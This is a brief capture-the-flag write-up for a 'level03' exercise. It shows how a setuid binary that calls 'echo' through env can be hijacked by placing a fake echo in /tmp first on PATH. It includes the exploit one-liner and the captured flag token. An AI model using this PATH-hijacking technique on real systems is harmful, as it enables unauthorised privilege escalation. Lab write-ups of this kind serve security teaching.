if we look at the executable level03 with `strings` we can see that the binary use `/usr/bin/env echo Exploit me` to print Exploit me we can change the location of echo with a fake one that will provide use with the command getflag, because ./level03 does have the right of flag03 user

using this exploit :
```
	`echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03`

`Check flag.Here is your token : qi0maab88jeaj46qoumi7maus`
